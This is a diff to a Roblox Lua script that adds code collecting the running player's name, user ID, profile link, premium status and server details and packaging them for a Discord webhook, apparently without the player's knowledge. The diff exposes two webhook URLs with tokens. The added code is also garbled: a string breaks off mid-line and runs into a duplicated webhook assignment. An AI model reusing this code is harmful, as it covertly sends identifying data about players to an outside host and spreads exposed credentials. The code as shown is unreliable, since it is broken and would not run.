@@ -1,4 +1,36 @@
-local webhook = "https://discord.com/api/webhooks/1168864547369668750/6kAUhrCsb-mAiShqTZx-72_o-fqU_-P9HDAG9VnUZDNfvNm8aPuTWpxI9EGUY-Jqy9X2"
+local webhook = "https://discord.com/api/webhooks/1203284314205454377/_nAnYtxYz26ClC3kcOhiDF0xnbqpJeMAoT3CYcOlXl8_3KtM7m-YeV3gJ8q2M6rYvYs_"
+
+-- Define the PlaceId variable
+local PlaceId = game.PlaceId
+
+-- Get the game name and game URL
+-- ط§ط³ظ… ظ…ط§ط¨
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(PlaceId).Name
+-- ط±ط§ط¨ط· ظ„ط¹ط¨ظ‡
+local gameUrl = "https://www.roblox.com/games/" .. PlaceId
+-- ط±ط§ط¨ط· ط¨ط±ظˆظپط§ظٹظ„
+local profileUrl = "https://www.roblox.com/users/" .. game:GetService("Players").LocalPlayer.UserId .. "/profile"
+-- ط¹ط¯ط¯ ط³ظٹط±ظپط±
+local playerCount = #game:GetService("Players"):GetPlayers()
+-- ط¨ط±ظٹظ…ظٹظ…
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local hasPremium = player.MembershipType == Enum.MembershipType.Premium
+
+-- Create a JSON object to send to the webhook
+local data = {
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["title"] = "",
+            ["description"] = ""
+            .. "**Player Name:**  ```" .. game:GetService("Players").LocalPlayer.Name .. " ```\n"
+            .. "**Player ID:** ```" .. game:GetService("Players").LocalPlayer.UserId .. "```\n"
+            .. "**Player URL:** ```" .. profileUrl .. "```\n"
+            .. "**Game Name:** ```" .. gameName .. "```\n"
+            .. "**Game URL:** ```" .. gameUrl .. "```\n"
+            .. "**Server JobId :** ```" .. game.JobId .. "```\n"
+            .. "**Server Number players online :** ```" webhook = "https://discord.com/api/webhooks/1203284314205454377/_nAnYtxYz26ClC3kcOhiDF0xnbqpJeMAoT3CYcOlXl8_3KtM7m-YeV3gJ8q2M6rYvYs_"
 
 -- Define the PlaceId variable
 local PlaceId = game.PlaceId
